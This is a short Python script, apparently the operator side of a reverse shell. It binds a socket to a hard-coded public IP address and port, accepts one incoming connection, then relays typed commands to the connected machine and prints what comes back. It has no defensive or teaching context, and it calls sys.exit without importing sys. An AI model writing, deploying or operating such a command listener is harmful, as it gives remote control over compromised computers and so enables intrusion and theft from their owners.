import socket
import threading
import os

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            server.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
            
bind_ip = "52.14.210.153"
bind_port = 24123
serv_add = (bind_ip , 24123)

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((serv_add))
server.listen(5)
print ("[*] listening on {}:{}".format(bind_ip,bind_port))
conn,addr = server.accept()
print('accepted connection from {} and port {}'.format(addr[0],addr[1]))
print("enter the commands below")
send_commands(conn)
conn.close()


        
        



